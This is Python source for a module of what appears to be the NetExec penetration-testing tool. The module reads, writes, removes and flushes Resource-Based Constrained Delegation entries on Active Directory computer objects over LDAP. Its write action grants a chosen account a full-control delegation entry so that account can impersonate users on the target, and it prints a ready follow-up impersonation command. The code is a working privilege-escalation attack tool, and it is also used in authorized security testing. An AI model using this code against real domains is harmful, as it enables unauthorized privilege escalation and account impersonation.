from impacket.ldap import ldaptypes
from impacket.ldap.ldap import MODIFY_DELETE, MODIFY_REPLACE, LDAPSessionError
from impacket.ldap.ldapasn1 import SDFlagsControl
from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes


class NXCModule:
    """
    Read, write, and remove Resource-Based Constrained Delegation (RBCD).

    Configures msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer
    to allow another principal to impersonate users via S4U2Self/S4U2Proxy.

    Module by @AhmadAlawneh3
    """

    name = "rbcd"
    description = "Read, write, and remove Resource-Based Constrained Delegation (RBCD) permissions"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    VALID_ACTIONS = ("read", "write", "remove", "flush")
    RBCD_ATTRIBUTE = "msDS-AllowedToActOnBehalfOfOtherIdentity"

    def options(self, context, module_options):
        """
        ACTION          read/write/remove/flush (default: read)
        DELEGATE_TO     Computer account to configure RBCD on (e.g., TARGET$)
        DELEGATE_FROM   SID or sAMAccountName of the account to allow delegation (required for write and remove)
        """
        self.action = module_options.get("ACTION", "read").lower()
        self.delegate_to = module_options.get("DELEGATE_TO")
        self.delegate_from = module_options.get("DELEGATE_FROM")

        if self.action not in self.VALID_ACTIONS:
            context.log.fail(f"Invalid ACTION '{self.action}'. Use one of: {', '.join(self.VALID_ACTIONS)}")
            return False
        if not self.delegate_to:
            context.log.fail("DELEGATE_TO option is required")
            return False
        if self.action in ("write", "remove") and not self.delegate_from:
            context.log.fail(f"DELEGATE_FROM option is required for the {self.action} action. Use ACTION=flush to clear every delegation entry on the target")
            return False

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection

        target_entry = self.get_target_object(self.delegate_to)
        if not target_entry:
            return

        if self.action == "read":
            self.read_rbcd(target_entry)
        elif self.action == "write":
            self.write_rbcd(target_entry)
        elif self.action == "remove":
            self.remove_rbcd(target_entry)
        elif self.action == "flush":
            self.flush_rbcd(target_entry)

    def get_target_object(self, sam_account_name):
        """Look up an object by sAMAccountName, return parsed entry with SD attributes"""
        sam = sam_account_name if sam_account_name.endswith("$") else f"{sam_account_name}$"
        resp = self.connection.search(
            searchFilter=f"(sAMAccountName={sam})",
            attributes=["distinguishedName", "objectSid", "sAMAccountName", self.RBCD_ATTRIBUTE],
            searchControls=[SDFlagsControl(criticality=True, flags=0x05)],
        )
        entries = parse_result_attributes(resp)
        if not entries:
            self.context.log.fail(f"Target object not found: {sam}")
            return None
        return entries[0]

    def read_rbcd(self, target_entry):
        """Read and display current RBCD configuration on the target"""
        rbcd_data = target_entry.get(self.RBCD_ATTRIBUTE)
        if not rbcd_data:
            self.context.log.display(f"No RBCD configured on {self.delegate_to}")
            return

        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))
        if not sd["Dacl"] or len(sd["Dacl"].aces) == 0:
            self.context.log.display(f"RBCD attribute exists but DACL is empty on {self.delegate_to}")
            return

        self.context.log.success(f"Found {len(sd['Dacl'].aces)} delegation entries on {self.delegate_to}:")
        for ace in sd["Dacl"].aces:
            sid = ace["Ace"]["Sid"].formatCanonical()
            self.context.log.highlight(f"  {self.resolve_sid(sid)} ({sid})")

    def resolve_sid(self, sid):
        """Resolve a SID to sAMAccountName via LDAP, fall back to SID string on failure"""
        entries = parse_result_attributes(self.connection.search(searchFilter=f"(objectSid={sid})", attributes=["sAMAccountName"]))
        return entries[0]["sAMAccountName"] if entries and entries[0].get("sAMAccountName") else sid

    def get_sid_for_principal(self, principal):
        """Accept either a SID (S-1-5-...) or a sAMAccountName, return the SID string"""
        if principal.upper().startswith("S-1-"):
            return principal

        entries = parse_result_attributes(self.connection.search(searchFilter=f"(sAMAccountName={principal})", attributes=["objectSid", "sAMAccountName"]))
        if not entries or not entries[0].get("objectSid"):
            sam_with_dollar = principal if principal.endswith("$") else f"{principal}$"
            entries = parse_result_attributes(self.connection.search(searchFilter=f"(sAMAccountName={sam_with_dollar})", attributes=["objectSid", "sAMAccountName"]))
            if not entries or not entries[0].get("objectSid"):
                self.context.log.fail(f"Could not resolve principal: {principal}")
                return None
        return entries[0]["objectSid"]

    def write_rbcd(self, target_entry):
        """Write RBCD: add DELEGATE_FROM's SID to the target's allowed delegation list"""
        from_sid = self.get_sid_for_principal(self.delegate_from)
        if not from_sid:
            return

        rbcd_data = target_entry.get(self.RBCD_ATTRIBUTE)
        if rbcd_data:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))
            if from_sid in [ace["Ace"]["Sid"].formatCanonical() for ace in sd["Dacl"].aces]:
                self.context.log.display(f"{self.delegate_from} ({from_sid}) is already allowed to delegate to {self.delegate_to}")
                return
        else:
            sd = self.create_empty_sd()

        sd["Dacl"].aces.append(self.create_allow_ace(from_sid))
        if self.modify_rbcd(target_entry["distinguishedName"], (MODIFY_REPLACE, sd.getData())):
            principal_label = self.delegate_from if self.delegate_from == from_sid else f"{self.delegate_from} ({from_sid})"
            self.context.log.success(f"RBCD configured: {principal_label} can now impersonate users to {self.delegate_to}")
            self.context.log.display(f"Impersonate with: nxc smb {self.delegate_to.rstrip('$')} -u '{self.delegate_from}' -p <password> --delegate <user to impersonate>")

    def remove_rbcd(self, target_entry):
        """Remove RBCD: drop DELEGATE_FROM's ACE from the target's allowed delegation list"""
        rbcd_data = target_entry.get(self.RBCD_ATTRIBUTE)
        if not rbcd_data:
            self.context.log.display(f"No RBCD configured on {self.delegate_to}, nothing to remove")
            return

        from_sid = self.get_sid_for_principal(self.delegate_from)
        if not from_sid:
            return

        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))
        original_count = len(sd["Dacl"].aces)
        sd["Dacl"].aces = [ace for ace in sd["Dacl"].aces if ace["Ace"]["Sid"].formatCanonical() != from_sid]
        if len(sd["Dacl"].aces) == original_count:
            self.context.log.display(f"{self.delegate_from} ({from_sid}) was not in the delegation list of {self.delegate_to}")
            return

        target_dn = target_entry["distinguishedName"]
        # AD does not keep an empty SD on this attribute, so drop it entirely once the last entry is gone
        if not sd["Dacl"].aces:
            if self.modify_rbcd(target_dn, (MODIFY_DELETE, [])):
                self.context.log.success(f"Removed last delegation entry and cleared attribute on {self.delegate_to}")
        elif self.modify_rbcd(target_dn, (MODIFY_REPLACE, sd.getData())):
            self.context.log.success(f"Removed {self.delegate_from} from delegation list of {self.delegate_to}")

    def flush_rbcd(self, target_entry):
        """Flush RBCD: remove every delegation entry by clearing the attribute"""
        rbcd_data = target_entry.get(self.RBCD_ATTRIBUTE)
        if not rbcd_data:
            self.context.log.display(f"No RBCD configured on {self.delegate_to}, nothing to flush")
            return

        self.context.log.display(f"Flushing all delegation entries on {self.delegate_to}:")
        for ace in ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))["Dacl"].aces:
            sid = ace["Ace"]["Sid"].formatCanonical()
            self.context.log.highlight(f"  {self.resolve_sid(sid)} ({sid})")

        if self.modify_rbcd(target_entry["distinguishedName"], (MODIFY_DELETE, [])):
            self.context.log.success(f"Cleared all RBCD configuration on {self.delegate_to}")

    def modify_rbcd(self, target_dn, modification):
        """Apply an LDAP modify to the RBCD attribute, translating common failures into actionable messages"""
        try:
            self.connection.ldap_connection.modify(target_dn, {self.RBCD_ATTRIBUTE: [modification]})
        except LDAPSessionError as e:
            if "insufficientAccessRights" in str(e):
                self.context.log.fail(f"Insufficient rights to modify {self.delegate_to} - need GenericWrite/GenericAll/WriteDACL on the target")
            elif "noSuchAttribute" in str(e):
                self.context.log.fail(f"Attribute does not exist on {self.delegate_to}")
            else:
                self.context.log.fail(f"LDAP modify failed: {e}")
            return False
        return True

    def create_empty_sd(self):
        r"""Build an empty security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity.

        Only used when the target has no existing SD on the attribute. When an SD already
        exists we read it with sdflags=0x05 (Owner+DACL) and mutate it in place so we
        don't clobber the existing Owner. AD rejects writes with a missing Owner with
        constraintViolation, so the fresh SD seeded here uses BUILTIN\Administrators.
        """
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd["Revision"] = b"\x01"
        sd["Sbz1"] = b"\x00"
        sd["Control"] = 32772
        sd["OwnerSid"] = ldaptypes.LDAP_SID()
        sd["OwnerSid"].fromCanonical("S-1-5-32-544")
        sd["GroupSid"] = b""
        sd["Sacl"] = b""
        acl = ldaptypes.ACL()
        acl["AclRevision"] = 4
        acl["Sbz1"] = 0
        acl["Sbz2"] = 0
        acl.aces = []
        sd["Dacl"] = acl
        return sd

    def create_allow_ace(self, sid):
        """Build an ACCESS_ALLOWED_ACE with full control mask for the given SID"""
        ace = ldaptypes.ACE()
        ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        ace["AceFlags"] = 0x00
        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
        acedata["Mask"] = ldaptypes.ACCESS_MASK()
        acedata["Mask"]["Mask"] = 983551
        acedata["Sid"] = ldaptypes.LDAP_SID()
        acedata["Sid"].fromCanonical(sid)
        ace["Ace"] = acedata
        return ace
